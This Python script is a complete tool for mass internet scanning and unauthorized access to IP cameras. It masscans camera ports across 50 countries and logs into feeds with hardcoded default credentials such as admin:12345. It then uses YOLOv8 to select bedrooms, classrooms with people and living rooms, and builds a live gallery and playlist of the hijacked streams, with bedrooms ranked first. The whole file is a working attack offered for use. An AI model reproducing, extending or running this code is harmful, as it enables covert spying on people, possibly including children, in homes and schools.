#!/usr/bin/env python3
"""
WORLD YOLO ROOM HUNTER — Multi-country masscan → ffmpeg frame grab → YOLOv8 classification
Targets: bedrooms (bed+wardrobe/dresser), classrooms (desk+chair+person), any indoor room
Auto-updates live HTML selector on every find. CPU YOLO (no GPU).
"""

import os, re, sys, json, time, shutil, subprocess, signal, hashlib, random
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from datetime import datetime

# ── Paths ──
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

WORK_DIR       = os.path.join(SCRIPT_DIR, "world_hunt")
FRAMES_DIR     = os.path.join(WORK_DIR, "frames")
OUT_DIR        = os.path.join(WORK_DIR, "results")
IMG_DIR        = os.path.join(OUT_DIR, "screenshots")
MASSCAN_DIR    = os.path.join(WORK_DIR, "masscan")
CIDR_DIR       = os.path.join(WORK_DIR, "cidrs")
YOLO_MODEL     = os.path.join(SCRIPT_DIR, "..", "..", "..", "yolov8n.pt")
STATE_FILE     = os.path.join(WORK_DIR, "hunt_state.json")
LOG_FILE       = os.path.join(WORK_DIR, "hunt.log")

for d in [WORK_DIR, FRAMES_DIR, OUT_DIR, IMG_DIR, MASSCAN_DIR, CIDR_DIR]:
    os.makedirs(d, exist_ok=True)

# ── Config ──
MAX_GRAB_WORKERS  = 100     # parallel ffmpeg
MAX_YOLO_WORKERS  = 4       # CPU YOLO threads (limited by CPU)
FFMPEG_TIMEOUT    = 5       # seconds per probe
MASSCAN_RATE      = 200000  # packets/sec
TARGET_ROOMS      = 5000    # keep hunting until this many rooms found
YOLO_CONF         = 0.35    # minimum YOLO confidence
BATCH_LOG         = 100     # log every N probes

# Target countries — top camera-density nations
# Format: country_code for ipdeny.com
COUNTRIES = [
    "es",  # Spain (already have some)
    "it",  # Italy
    "fr",  # France  
    "de",  # Germany
    "pt",  # Portugal
    "nl",  # Netherlands
    "be",  # Belgium
    "gr",  # Greece
    "tr",  # Turkey
    "ru",  # Russia
    "ua",  # Ukraine
    "ro",  # Romania
    "pl",  # Poland
    "cz",  # Czech Republic
    "hu",  # Hungary
    "bg",  # Bulgaria
    "rs",  # Serbia
    "hr",  # Croatia
    "th",  # Thailand
    "vn",  # Vietnam
    "id",  # Indonesia
    "ph",  # Philippines
    "my",  # Malaysia
    "in",  # India
    "pk",  # Pakistan
    "bd",  # Bangladesh
    "cn",  # China
    "kr",  # South Korea
    "jp",  # Japan
    "tw",  # Taiwan
    "br",  # Brazil
    "mx",  # Mexico
    "ar",  # Argentina
    "co",  # Colombia
    "cl",  # Chile
    "pe",  # Peru
    "za",  # South Africa
    "eg",  # Egypt
    "ng",  # Nigeria
    "ke",  # Kenya
    "us",  # USA
    "ca",  # Canada
    "gb",  # UK
    "au",  # Australia
    "nz",  # New Zealand
    "il",  # Israel
    "ae",  # UAE
    "sa",  # Saudi Arabia
    "ir",  # Iran
    "iq",  # Iraq
]

# Camera ports to scan
CAMERA_PORTS = "554,8000,8080,8200,37777,8899,9010,9020"

# RTSP URLs to try per IP
RTSP_PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/h264/ch1/main/av_stream",
    "/stream1",
    "/cam/realmonitor?channel=1&subtype=0",
    "/live/ch00_0",
    "/onvif1",
]

# Credentials (ordered by frequency)
CREDS = [
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "1111"),
    ("root", "pass"),
    ("root", "1234"),
    ("root", ""),
]

# ── YOLO scene classification rules ──
# COCO class IDs: bed=59, chair=56, couch=57, diningtable=60, laptop=63, 
# tvmonitor=62, book=73, clock=74, person=0, backpack=24, handbag=26
ROOM_CATEGORIES = {
    "bedroom": {
        "must_have": [59],           # bed required
        "bonus": [56, 57, 62, 74],   # chair, couch, tv, clock
        "label": "🛏️ Bedroom",
        "priority": 1,
    },
    "classroom": {
        "must_have": [56],           # chair required  
        "bonus": [0, 63, 73, 62],   # person, laptop, book, tv
        "min_bonus": 2,              # need at least 2 bonus objects
        "label": "🏫 Classroom",
        "priority": 2,
    },
    "livingroom": {
        "must_have": [57],           # couch required
        "bonus": [62, 56, 74],      # tv, chair, clock
        "label": "🛋️ Living Room",
        "priority": 3,
    },
    "any_indoor": {
        "must_have": [],
        "bonus": [59, 56, 57, 60, 62, 63, 73, 74],  # any furniture
        "min_bonus": 3,
        "label": "🏠 Indoor Room",
        "priority": 4,
    },
}

stop_flag = False

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(line + "\n")
    except:
        pass


# ═══════════════════════════════════════════════════════
# PHASE 1: Download CIDR blocks from ipdeny.com
# ═══════════════════════════════════════════════════════

def download_cidrs():
    """Download country CIDR blocks from ipdeny.com."""
    log(f"[PHASE 1] Downloading CIDR blocks for {len(COUNTRIES)} countries...")
    
    all_cidr_file = os.path.join(CIDR_DIR, "all_countries.txt")
    if os.path.exists(all_cidr_file) and os.path.getsize(all_cidr_file) > 100000:
        lines = open(all_cidr_file).readlines()
        log(f"  Using cached CIDR file: {len(lines)} blocks")
        return all_cidr_file
    
    total_blocks = 0
    with open(all_cidr_file, 'w') as out:
        for cc in COUNTRIES:
            url = f"https://www.ipdeny.com/ipblocks/data/countries/{cc}.zone"
            cc_file = os.path.join(CIDR_DIR, f"{cc}.zone")
            
            if os.path.exists(cc_file) and os.path.getsize(cc_file) > 100:
                blocks = open(cc_file).readlines()
            else:
                try:
                    result = subprocess.run(
                        ["curl", "-sL", "--connect-timeout", "10", url],
                        capture_output=True, text=True, timeout=30
                    )
                    if result.returncode == 0 and result.stdout.strip():
                        with open(cc_file, 'w') as f:
                            f.write(result.stdout)
                        blocks = result.stdout.strip().split('\n')
                    else:
                        log(f"  ⚠ {cc.upper()} — download failed")
                        continue
                except Exception as e:
                    log(f"  ⚠ {cc.upper()} — {e}")
                    continue
            
            count = 0
            for line in blocks:
                line = line.strip()
                if line and '/' in line:
                    out.write(line + "\n")
                    count += 1
            
            total_blocks += count
            log(f"  ✓ {cc.upper()}: {count} CIDR blocks")
    
    log(f"[PHASE 1] Total: {total_blocks} CIDR blocks from {len(COUNTRIES)} countries → {all_cidr_file}")
    return all_cidr_file


# ═══════════════════════════════════════════════════════
# PHASE 2: Run masscan on camera ports
# ═══════════════════════════════════════════════════════

def run_masscan(cidr_file):
    """Run masscan against all CIDRs targeting camera ports."""
    masscan_out = os.path.join(MASSCAN_DIR, "world_masscan.txt")
    
    # Check if masscan already ran
    if os.path.exists(masscan_out) and os.path.getsize(masscan_out) > 1000000:
        log(f"[PHASE 2] Using existing masscan results: {masscan_out}")
        return masscan_out
    
    log(f"[PHASE 2] Running masscan at {MASSCAN_RATE} pps against ports {CAMERA_PORTS}...")
    log(f"  This will take a while for {len(COUNTRIES)} countries...")
    
    cmd = [
        "masscan",
        "-iL", cidr_file,
        "-p", CAMERA_PORTS,
        "--rate", str(MASSCAN_RATE),
        "--open-only",
        "-oG", masscan_out,
    ]
    
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Monitor progress
    while proc.poll() is None:
        if stop_flag:
            proc.terminate()
            break
        time.sleep(30)
        if os.path.exists(masscan_out):
            size_mb = os.path.getsize(masscan_out) / (1024*1024)
            lines = sum(1 for _ in open(masscan_out))
            log(f"  masscan progress: {size_mb:.1f}MB, {lines} lines")
    
    rc = proc.wait()
    log(f"[PHASE 2] Masscan finished (rc={rc})")
    return masscan_out


def parse_masscan(masscan_file):
    """Parse masscan results — extract IPs with camera ports, prioritize RTSP."""
    ip_ports = {}
    
    # Also include existing spain_masscan.txt
    files_to_parse = [masscan_file]
    spain_masscan = os.path.join(SCRIPT_DIR, "spain_masscan.txt")
    if os.path.exists(spain_masscan):
        files_to_parse.append(spain_masscan)
    
    for mf in files_to_parse:
        if not os.path.exists(mf):
            continue
        with open(mf) as f:
            for line in f:
                # Format: Host: 86.109.107.107 ()  Ports: 554/open/tcp//rtsp//
                m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)/', line)
                if not m:
                    continue
                ip, port = m.group(1), m.group(2)
                if ip not in ip_ports:
                    ip_ports[ip] = set()
                ip_ports[ip].add(port)
    
    # Prioritize by port
    rtsp_ips = []      # port 554 — most likely cameras
    hikvision_ips = []  # port 8000 — Hikvision
    http_ips = []       # port 8080/8200/37777 — other cameras
    
    for ip, ports in ip_ports.items():
        if '554' in ports:
            rtsp_ips.append(ip)
        elif '8000' in ports:
            hikvision_ips.append(ip)
        elif ports & {'8080', '8200', '37777', '8899', '9010', '9020'}:
            http_ips.append(ip)
    
    random.shuffle(rtsp_ips)
    random.shuffle(hikvision_ips)
    random.shuffle(http_ips)
    
    log(f"  RTSP (554): {len(rtsp_ips)} | Hikvision (8000): {len(hikvision_ips)} | HTTP: {len(http_ips)}")
    return rtsp_ips + hikvision_ips + http_ips


# ═══════════════════════════════════════════════════════
# PHASE 3: Frame grabbing
# ═══════════════════════════════════════════════════════

def grab_frame(ip):
    """Try to grab a single frame from camera. Returns (ip, filepath) or None."""
    out_file = os.path.join(FRAMES_DIR, ip.replace('.', '_') + '.jpg')
    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
        return (ip, out_file)
    
    # Try RTSP first (top 3 creds × top 4 paths = 12 attempts max)
    for user, passwd in CREDS[:3]:
        for path in RTSP_PATHS[:4]:
            auth = f"{user}:{passwd}@" if user else ""
            url = f"rtsp://{auth}{ip}:554{path}"
            try:
                subprocess.run(
                    ["ffmpeg", "-nostdin", "-rtsp_transport", "tcp",
                     "-i", url, "-vframes", "1", "-f", "image2", "-y", out_file],
                    capture_output=True, timeout=FFMPEG_TIMEOUT
                )
                if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                    return (ip, out_file)
            except (subprocess.TimeoutExpired, Exception):
                pass
    
    # Try HTTP snapshot endpoints
    for port in ["8000", "8080", "80"]:
        for snap_path in [
            "/ISAPI/Streaming/channels/101/picture",
            "/cgi-bin/snapshot.cgi",
            "/snap.jpg",
            "/Streaming/channels/1/picture",
            "/cgi-bin/images_cgi?channel=0&user=admin&pwd=12345",
        ]:
            url = f"http://admin:12345@{ip}:{port}{snap_path}"
            try:
                subprocess.run(
                    ["ffmpeg", "-nostdin", "-i", url,
                     "-vframes", "1", "-f", "image2", "-y", out_file],
                    capture_output=True, timeout=FFMPEG_TIMEOUT
                )
                if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                    return (ip, out_file)
            except (subprocess.TimeoutExpired, Exception):
                pass
    
    # Cleanup bad file
    if os.path.exists(out_file) and os.path.getsize(out_file) < 5000:
        try: os.unlink(out_file)
        except: pass
    return None


# ═══════════════════════════════════════════════════════
# PHASE 4: YOLO classification
# ═══════════════════════════════════════════════════════

_yolo_model = None

def get_yolo():
    global _yolo_model
    if _yolo_model is None:
        from ultralytics import YOLO
        model_path = YOLO_MODEL
        if not os.path.exists(model_path):
            model_path = "yolov8n.pt"
        _yolo_model = YOLO(model_path)
        log(f"  YOLO model loaded: {model_path}")
    return _yolo_model


def classify_frame_yolo(filepath):
    """
    Run YOLOv8 on frame. Returns (room_type, label, score, objects_found, detail) or None.
    room_type: 'bedroom', 'classroom', 'livingroom', 'any_indoor'
    """
    try:
        model = get_yolo()
        results = model(filepath, conf=YOLO_CONF, verbose=False)
        
        if not results or len(results) == 0:
            return None
        
        # Collect detected class IDs and counts
        detections = {}
        for r in results:
            for box in r.boxes:
                cls_id = int(box.cls[0])
                conf = float(box.conf[0])
                cls_name = r.names[cls_id]
                if cls_id not in detections:
                    detections[cls_id] = {"name": cls_name, "count": 0, "max_conf": 0}
                detections[cls_id]["count"] += 1
                detections[cls_id]["max_conf"] = max(detections[cls_id]["max_conf"], conf)
        
        if not detections:
            return None
        
        detected_ids = set(detections.keys())
        obj_summary = ", ".join(f"{d['name']}×{d['count']}" for d in detections.values())
        
        # Score each room category
        best_match = None
        best_score = 0
        
        for room_type, rules in ROOM_CATEGORIES.items():
            must = set(rules["must_have"])
            bonus = set(rules.get("bonus", []))
            min_bonus = rules.get("min_bonus", 0)
            
            # Must-have check
            if must and not must.issubset(detected_ids):
                continue
            
            # Bonus score
            bonus_found = bonus & detected_ids
            if min_bonus and len(bonus_found) < min_bonus:
                continue
            
            # Calculate score: must-have confidence + bonus count
            score = 0
            for cls_id in must:
                if cls_id in detections:
                    score += detections[cls_id]["max_conf"] * 3
            for cls_id in bonus_found:
                score += detections[cls_id]["max_conf"]
            
            # Person bonus for classrooms
            if room_type == "classroom" and 0 in detections:
                person_count = detections[0]["count"]
                if person_count >= 3:
                    score += person_count * 0.5  # More people = more likely classroom
            
            if score > best_score:
                best_score = score
                best_match = room_type
        
        if best_match:
            cat = ROOM_CATEGORIES[best_match]
            return (best_match, cat["label"], best_score, cat["priority"], obj_summary)
        
        return None
    
    except Exception as e:
        return None


# ═══════════════════════════════════════════════════════
# HTML Selector Builder (auto-refresh)
# ═══════════════════════════════════════════════════════

def build_selector(rooms):
    """Build live-updating HTML selector + M3U + manifest."""
    
    # Copy screenshots
    for cam in rooms:
        src = cam.get("frame_path", "")
        if src and os.path.exists(src):
            dst = os.path.join(IMG_DIR, os.path.basename(src))
            if not os.path.exists(dst):
                shutil.copy2(src, dst)
            cam["screenshot_url"] = f"screenshots/{os.path.basename(src)}"
    
    # Stats
    type_counts = {}
    for cam in rooms:
        rt = cam.get("room_type", "unknown")
        type_counts[rt] = type_counts.get(rt, 0) + 1
    
    # Manifest
    manifest = {
        "title": "🌍 World Room Hunter — YOLO Detection",
        "timestamp": str(int(time.time())),
        "total": len(rooms),
        "type_counts": type_counts,
        "cameras": rooms
    }
    with open(os.path.join(OUT_DIR, "manifest.json"), 'w') as f:
        json.dump(manifest, f, indent=2)
    
    # M3U
    m3u = "#EXTM3U\n# WORLD ROOM HUNTER — YOLO Detected Rooms\n"
    for cam in rooms:
        label = cam.get("room_label", "Room")
        m3u += f"#EXTINF:-1,[{label}] {cam['ip']}\n"
        if cam.get("rtsp_urls"):
            m3u += f"{cam['rtsp_urls'][0]}\n\n"
    with open(os.path.join(OUT_DIR, "cameras.m3u"), 'w') as f:
        f.write(m3u)
    
    # HTML
    html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🌍 World Room Hunter — YOLO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;color:#fff;padding:12px}
.hdr{text-align:center;margin-bottom:16px}
.hdr h1{font-size:1.8em;background:linear-gradient(90deg,#ff6b6b,#4ecdc4,#45b7d1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:5px}
.stats{display:flex;justify-content:center;gap:12px;margin:12px 0;flex-wrap:wrap}
.stat{background:#1a1a1a;padding:8px 14px;border-radius:8px;border:1px solid #333}
.stat strong{color:#4ecdc4}
.stat.bed strong{color:#ff6b6b}
.stat.class strong{color:#45b7d1}
.stat.live strong{color:#ffd700}
.filters{display:flex;gap:6px;justify-content:center;margin:12px 0;flex-wrap:wrap}
.fbtn{padding:8px 14px;border-radius:20px;border:1px solid #444;background:#1a1a1a;color:#fff;cursor:pointer;font-size:0.9em}
.fbtn.active{background:#4ecdc4;color:#000;border-color:#4ecdc4;font-weight:bold}
.ctrls{display:flex;gap:8px;justify-content:center;margin:12px 0;flex-wrap:wrap}
button{background:#4ecdc4;color:#000;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:0.9em}
button:active{transform:scale(0.95)}
.dl{background:#ff6b6b;color:#fff}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px}
.card{background:#1a1a1a;border-radius:8px;overflow:hidden;border:2px solid transparent;position:relative;transition:all 0.15s}
.card:hover{border-color:#4ecdc4;transform:translateY(-2px)}
.card.sel{border-color:#ff6b6b;box-shadow:0 0 12px rgba(255,107,107,0.4)}
.card .badge{position:absolute;top:6px;right:6px;padding:3px 8px;border-radius:10px;font-size:0.75em;font-weight:bold;z-index:2}
.badge.bedroom{background:#ff6b6b}
.badge.classroom{background:#45b7d1}
.badge.livingroom{background:#ffd700;color:#000}
.badge.any_indoor{background:#9b59b6}
.card input[type=checkbox]{position:absolute;top:8px;left:8px;width:18px;height:18px;z-index:5;cursor:pointer}
.card img{width:100%;height:170px;object-fit:cover;display:block;cursor:pointer}
.card .info{padding:6px 10px;font-size:0.82em}
.card .ip{color:#4ecdc4;font-weight:bold;word-break:break-all}
.card .objs{color:#888;font-size:0.78em;margin-top:2px}
.card .vlc{display:block;background:#ff6b6b;color:#fff;text-align:center;padding:6px;font-size:0.85em;text-decoration:none;font-weight:bold;border:none}
.card .vlc:active{background:#e05050}
.updated{font-size:0.85em;color:#666;margin-top:5px}
</style>
</head>
<body>
<div class="hdr">
<h1>🌍 World Room Hunter — YOLO AI Detection</h1>
<p style="color:#999">Real-time room discovery across 50 countries</p>
<div class="stats">
<div class="stat live">🔴 Live: <strong id="total">0</strong></div>
<div class="stat bed">🛏️ Bedrooms: <strong id="beds">0</strong></div>
<div class="stat class">🏫 Classrooms: <strong id="classes">0</strong></div>
<div class="stat">🛋️ Living: <strong id="living">0</strong></div>
<div class="stat">🏠 Other: <strong id="other">0</strong></div>
<div class="stat">✓ Selected: <strong id="selcount">0</strong></div>
</div>
<div class="updated">Updated: <span id="upd">—</span> · Auto-refresh 5s</div>
</div>
<div class="filters" id="filters">
<span class="fbtn active" onclick="setFilter('all')">All</span>
<span class="fbtn" onclick="setFilter('bedroom')">🛏️ Bedrooms</span>
<span class="fbtn" onclick="setFilter('classroom')">🏫 Classrooms</span>
<span class="fbtn" onclick="setFilter('livingroom')">🛋️ Living</span>
<span class="fbtn" onclick="setFilter('any_indoor')">🏠 Other</span>
</div>
<div class="ctrls">
<button onclick="selAll()">✓ All</button>
<button onclick="desel()">✗ None</button>
<button class="dl" onclick="dlm3u()">⬇️ .m3u</button>
<button onclick="location.reload()">🔄</button>
</div>
<div class="grid" id="grid"></div>
<script>
let cams=[],sel=new Set(),filt='all';
function load(){
fetch('manifest.json?t='+Date.now()).then(r=>r.json()).then(d=>{
cams=d.cameras||[];
document.getElementById('total').textContent=cams.length;
document.getElementById('beds').textContent=(d.type_counts||{}).bedroom||0;
document.getElementById('classes').textContent=(d.type_counts||{}).classroom||0;
document.getElementById('living').textContent=(d.type_counts||{}).livingroom||0;
document.getElementById('other').textContent=(d.type_counts||{}).any_indoor||0;
document.getElementById('upd').textContent=new Date(parseInt(d.timestamp)*1000).toLocaleString();
render();
}).catch(()=>{});
}
function render(){
const g=document.getElementById('grid');g.innerHTML='';
const fc=cams.filter(c=>filt==='all'||c.room_type===filt);
fc.forEach((c,i)=>{
const idx=cams.indexOf(c);
const d=document.createElement('div');
d.className='card'+(sel.has(idx)?' sel':'');
const rtsp=c.rtsp_urls&&c.rtsp_urls[0]?c.rtsp_urls[0]:'';
d.innerHTML=`
<span class="badge ${c.room_type||''}">${c.room_label||'Room'}</span>
<input type="checkbox" ${sel.has(idx)?'checked':''} onchange="tog(${idx})" onclick="event.stopPropagation()">
<img src="${c.screenshot_url||''}" alt="${c.ip}" loading="lazy">
<div class="info">
<div class="ip">${c.ip}</div>
<div class="objs">${c.objects||''}</div>
</div>
<a class="vlc" href="vlc://${rtsp}" onclick="event.stopPropagation()">▶ Play</a>`;
d.querySelector('img').onclick=()=>window.open('vlc://'+rtsp);
g.appendChild(d);
});
}
function setFilter(f){filt=f;document.querySelectorAll('.fbtn').forEach(b=>{b.classList.toggle('active',b.textContent.toLowerCase().includes(f)||f==='all'&&b.textContent==='All')});render();}
function tog(i){sel.has(i)?sel.delete(i):sel.add(i);upd();}
function selAll(){cams.forEach((_,i)=>{if(filt==='all'||cams[i].room_type===filt)sel.add(i)});upd();}
function desel(){sel.clear();upd();}
function upd(){document.getElementById('selcount').textContent=sel.size;render();}
function dlm3u(){
if(!sel.size)return alert('Select cameras');
let m='#EXTM3U\\n';
sel.forEach(i=>{const c=cams[i];if(c.rtsp_urls&&c.rtsp_urls[0])m+=`#EXTINF:-1,[${c.room_label}] ${c.ip}\\n${c.rtsp_urls[0]}\\n`;});
const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([m],{type:'audio/x-mpegurl'}));
a.download=`world_rooms_${sel.size}.m3u`;a.click();
}
load();setInterval(load,5000);
</script>
</body>
</html>"""
    
    with open(os.path.join(OUT_DIR, "screenshot_selector.html"), 'w') as f:
        f.write(html)


# ═══════════════════════════════════════════════════════
# State persistence (resume after restart)
# ═══════════════════════════════════════════════════════

def save_state(rooms, probed_ips):
    state = {
        "rooms": rooms,
        "probed_count": len(probed_ips),
        "timestamp": int(time.time()),
    }
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f)


def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                state = json.load(f)
            rooms = state.get("rooms", [])
            log(f"  Resumed state: {len(rooms)} rooms found previously")
            return rooms
        except:
            pass
    return []


# ═══════════════════════════════════════════════════════
# Also classify existing spain_frames with YOLO
# ═══════════════════════════════════════════════════════

def classify_existing_frames(rooms):
    """Classify frames already in spain_frames/ and spain_indoor_frames/ with YOLO."""
    existing_ips = {r["ip"] for r in rooms}
    
    frame_dirs = [
        os.path.join(SCRIPT_DIR, "spain_frames"),
        os.path.join(SCRIPT_DIR, "spain_indoor_frames"),
    ]
    
    all_frames = []
    for fdir in frame_dirs:
        if not os.path.isdir(fdir):
            continue
        for f in os.listdir(fdir):
            if f.endswith('.jpg'):
                ip = f.replace('.jpg', '').replace('_', '.')
                if ip not in existing_ips:
                    all_frames.append((ip, os.path.join(fdir, f)))
    
    if not all_frames:
        return rooms
    
    log(f"[PHASE 3a] YOLO-classifying {len(all_frames)} existing frames...")
    
    found = 0
    for idx, (ip, fpath) in enumerate(all_frames):
        result = classify_frame_yolo(fpath)
        if result:
            room_type, label, score, priority, objects = result
            rooms.append({
                "ip": ip,
                "frame_path": fpath,
                "room_type": room_type,
                "room_label": label,
                "yolo_score": float(score),
                "priority": priority,
                "objects": objects,
                "size_bytes": os.path.getsize(fpath),
                "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                "screenshot_url": "",
            })
            found += 1
            if found % 5 == 0:
                rooms.sort(key=lambda x: (x.get("priority", 99), -x.get("yolo_score", 0)))
                build_selector(rooms)
                log(f"  [{idx+1}/{len(all_frames)}] Found {found} rooms (latest: {label} {ip})")
        
        if (idx+1) % 50 == 0:
            log(f"  [{idx+1}/{len(all_frames)}] scanned, {found} rooms found")
    
    log(f"[PHASE 3a] Existing frames: {found} rooms from {len(all_frames)} frames")
    return rooms


# ═══════════════════════════════════════════════════════
# MAIN PIPELINE
# ═══════════════════════════════════════════════════════

def main():
    global stop_flag
    
    def sig_handler(sig, frame):
        global stop_flag
        stop_flag = True
        log("[!] SIGINT — saving state and stopping...")
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)
    
    t0 = time.time()
    
    log("=" * 65)
    log("🌍 WORLD YOLO ROOM HUNTER")
    log(f"Countries: {len(COUNTRIES)} | Target: {TARGET_ROOMS} rooms")
    log(f"Categories: bedroom, classroom, livingroom, any_indoor")
    log(f"YOLO confidence: {YOLO_CONF} | Masscan rate: {MASSCAN_RATE} pps")
    log("=" * 65)
    
    # Load previous state
    rooms = load_state()
    
    # PHASE 1: Download CIDRs
    cidr_file = download_cidrs()
    if stop_flag: return
    
    # PHASE 2: Masscan
    masscan_file = run_masscan(cidr_file)
    if stop_flag:
        save_state(rooms, set())
        return
    
    # Parse masscan results
    all_ips = parse_masscan(masscan_file)
    log(f"[*] Total camera IPs to probe: {len(all_ips)}")
    
    # PHASE 3a: Classify existing frames first
    rooms = classify_existing_frames(rooms)
    if rooms:
        rooms.sort(key=lambda x: (x.get("priority", 99), -x.get("yolo_score", 0)))
        build_selector(rooms)
        save_state(rooms, set())
        log(f"[✓] Initial selector built: {len(rooms)} rooms")
    
    if stop_flag or len(rooms) >= TARGET_ROOMS:
        build_selector(rooms)
        save_state(rooms, set())
        log(f"[✓] Target reached or stopped: {len(rooms)} rooms")
        return
    
    # PHASE 3b: Grab + classify new frames
    existing_ips = {r["ip"] for r in rooms}
    # Also skip IPs we already have frames for (even if not rooms)
    already_framed = set()
    if os.path.isdir(FRAMES_DIR):
        for f in os.listdir(FRAMES_DIR):
            if f.endswith('.jpg'):
                already_framed.add(f.replace('.jpg', '').replace('_', '.'))
    
    ips_to_probe = [ip for ip in all_ips if ip not in existing_ips and ip not in already_framed]
    log(f"\n[PHASE 3b] Probing {len(ips_to_probe)} new IPs (skipping {len(existing_ips)+len(already_framed)} known)...")
    
    probed = 0
    grabbed = 0
    
    with ThreadPoolExecutor(max_workers=MAX_GRAB_WORKERS) as grab_pool:
        chunk_size = 1000
        for chunk_start in range(0, len(ips_to_probe), chunk_size):
            if stop_flag or len(rooms) >= TARGET_ROOMS:
                break
            
            chunk = ips_to_probe[chunk_start:chunk_start + chunk_size]
            futures = {grab_pool.submit(grab_frame, ip): ip for ip in chunk}
            
            for future in as_completed(futures):
                if stop_flag or len(rooms) >= TARGET_ROOMS:
                    break
                
                probed += 1
                result = future.result()
                
                if result:
                    ip, fpath = result
                    grabbed += 1
                    
                    # YOLO classify immediately
                    yolo_result = classify_frame_yolo(fpath)
                    if yolo_result:
                        room_type, label, score, priority, objects = yolo_result
                        rooms.append({
                            "ip": ip,
                            "frame_path": fpath,
                            "room_type": room_type,
                            "room_label": label,
                            "yolo_score": float(score),
                            "priority": priority,
                            "objects": objects,
                            "size_bytes": os.path.getsize(fpath),
                            "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                            "screenshot_url": "",
                        })
                        # Auto-update selector on every room found
                        rooms.sort(key=lambda x: (x.get("priority", 99), -x.get("yolo_score", 0)))
                        build_selector(rooms)
                        log(f"  🎯 ROOM #{len(rooms)}: {label} @ {ip} [{objects}] score={score:.1f}")
                
                if probed % BATCH_LOG == 0:
                    elapsed = time.time() - t0
                    rate = probed / max(elapsed, 1)
                    log(f"  [{probed}/{len(ips_to_probe)}] {elapsed:.0f}s | "
                        f"grabbed={grabbed} rooms={len(rooms)}/{TARGET_ROOMS} | "
                        f"{rate:.1f} ip/s")
                    save_state(rooms, set())
    
    # Final save
    rooms.sort(key=lambda x: (x.get("priority", 99), -x.get("yolo_score", 0)))
    build_selector(rooms)
    save_state(rooms, set())
    
    elapsed = time.time() - t0
    type_counts = {}
    for r in rooms:
        rt = r.get("room_type", "unknown")
        type_counts[rt] = type_counts.get(rt, 0) + 1
    
    log("")
    log("=" * 65)
    log(f"🏁 HUNT COMPLETE in {elapsed:.0f}s ({elapsed/3600:.1f}h)")
    log(f"   Probed: {probed} IPs | Grabbed: {grabbed} frames")
    log(f"   Rooms found: {len(rooms)}")
    for rt, cnt in sorted(type_counts.items()):
        log(f"     {ROOM_CATEGORIES.get(rt, {}).get('label', rt)}: {cnt}")
    log(f"   Selector: {OUT_DIR}/screenshot_selector.html")
    log("=" * 65)


if __name__ == "__main__":
    main()
